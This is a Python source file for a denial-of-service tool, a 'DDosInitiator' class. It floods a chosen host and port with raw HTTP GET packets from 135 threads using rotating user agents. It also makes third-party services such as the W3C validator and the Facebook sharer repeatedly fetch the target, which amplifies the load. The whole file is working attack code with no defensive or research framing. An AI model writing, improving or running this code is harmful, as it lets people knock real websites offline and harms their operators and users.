import time
import random
import socket
import threading
import requests
from queue import Queue


class DDosInitiator:
    _q = Queue()
    _w = Queue()
    _user_agent_list = None
    _third_party_bots_list = None
    _header_data = None
    _total_thread_number = None
    _target_host = ''
    _target_port = None
    _first = True
    work = True

    def __init__(self):
        self._user_agent_list = [
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        ]
        self._third_party_bots_list = [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u=",
        ]
        f_headers = open("./headers.txt", "r")
        self._header_data = f_headers.read()
        f_headers.close()
        self._total_thread_number = 135

    def _bot_hammering(self, url):
        try:
            res = requests.get(url, headers={'User-Agent': random.choice(self._user_agent_list)}, timeout=0.1)
            # res = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
            # print(res.text)
            print("\033[94mbot is hammering...\033[0m")
        except Exception as e:
            pass

    def _down_it(self):
        try:
            packet = str("GET / HTTP/1.1\nHost: " + self._target_host + "\n\n User-Agent: " +
                         random.choice(self._user_agent_list) + "\n" + self._header_data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self._target_host, int(self._target_port)))
            if s.sendto(packet, (self._target_host, int(self._target_port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(.1)
        except socket.error as e:
            print("\033[91mno connection! server maybe down\033[0m")
            # print("\033[91m",e,"\033[0m")
            time.sleep(.1)

    def _thread(self, th):
        while self.work:
            # Remove one in the task queue or suspend here
            th.get()
            if th is self._q:
                self._down_it()
            elif th is self._w:
                self._bot_hammering(random.choice(self._third_party_bots_list) + "http://" + self._target_host)
            th.task_done()

    def _dos(self):
        # Allocate threads
        if self._first:
            for i in range(int(self._total_thread_number)):
                t = threading.Thread(target=self._thread, args=(self._q,))
                # t.daemon = True  # if thread is exist, it dies
                t.start()
                t2 = threading.Thread(target=self._thread, args=(self._w,))
                # t2.daemon = True  # if thread is exist, it dies
                t2.start()
        self._first = False

        # Add task to the queue
        for i in range(int(self._total_thread_number)):
            self._q.put(i)
            self._w.put(i)

    def start(self, target_host='', target_port=0):
        self._target_host = target_host
        self._target_port = target_port
        # self.get_parameters()

        print("\033[92m", self._target_host, " port: ", str(self._target_port), " turbo: ",
              str(self._total_thread_number),
              "\033[0m")
        print("\033[94mPlease wait...\033[0m")
        # time.sleep(5)

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self._target_host, int(self._target_port)))
            s.settimeout(1)

        except socket.error as e:
            print("\033[91mcheck server ip and port\033[0m")
            time.sleep(10)
            return

        self._dos()
